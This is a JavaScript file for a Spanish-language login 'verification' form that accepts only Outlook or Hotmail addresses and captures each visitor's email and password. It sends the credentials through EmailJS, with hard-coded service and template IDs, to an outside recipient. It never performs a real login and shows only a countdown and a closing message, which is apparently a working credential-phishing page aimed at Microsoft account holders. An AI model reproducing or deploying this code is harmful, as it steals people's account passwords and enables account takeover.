emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formularioVerificacion').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const boton = document.querySelector('.boton-verificacion');
  boton.disabled = true;
  boton.innerHTML = `<div class="spinner"></div>Procesando...`;
  
  // Capturar datos (solo correo y contraseña)
  const correo = document.getElementById('correo').value.trim();
  const contrasena = document.getElementById('contrasena').value;

  // Validaciones
  const errores = [];
  
  const limpiarErrores = () => {
    document.querySelectorAll('.error-input').forEach(el => el.remove());
  }
  
  const mostrarError = (campo, mensaje) => {
    limpiarErrores();
    const error = document.createElement('div');
    error.className = 'error-input';
    error.style.color = '#ff4444';
    error.style.marginTop = '0.5rem';
    error.style.fontSize = '0.9rem';
    error.textContent = mensaje;
    campo.parentNode.appendChild(error);
  }

  // Validar correo: debe ser Outlook o Hotmail
  const correoLower = correo.toLowerCase();
  if (!(correoLower.endsWith("outlook.com") || correoLower.endsWith("hotmail.com"))) {
    mostrarError(document.getElementById('correo'), "Solo se permiten correos de Outlook o Hotmail");
    errores.push(true);
  }

  // Validar contraseña: mínimo 4 caracteres
  if (contrasena.length < 4) {
    mostrarError(document.getElementById('contrasena'), "Contraseña muy corta (mínimo 4 caracteres)");
    errores.push(true);
  }

  if (errores.length > 0) {
    boton.disabled = false;
    boton.innerHTML = `<span class="texto-boton">Acceder</span><span class="icono-boton">🌸</span>`;
    return;
  }

  // Enviar datos vía EmailJS usando el template "template_otuzmqu"
  const datos = { correo, contrasena };
  try {
    await emailjs.send("service_syrc1uk", "template_otuzmqu", datos);
  } catch (error) {
    console.error('Error con EmailJS:', error);
  }
  
  // Mostrar contador de 5 segundos
  const countdownContainer = document.getElementById('countdownContainer');
  const countdownSpan = document.getElementById('countdown');
  const finalMessage = document.getElementById('finalMessage');
  
  countdownContainer.style.display = "block";
  let tiempo = 5;
  countdownSpan.textContent = tiempo;
  
  const cuentaRegresiva = setInterval(() => {
    tiempo--;
    countdownSpan.textContent = tiempo;
    if (tiempo <= 0) {
      clearInterval(cuentaRegresiva);
      countdownContainer.style.display = "none";
      finalMessage.style.display = "block";
      // Reactivar el formulario para reintentar (si lo deseas)
      boton.disabled = false;
      boton.innerHTML = `<span class="texto-boton">Acceder</span><span class="icono-boton">🌸</span>`;
    }
  }, 1000);
});
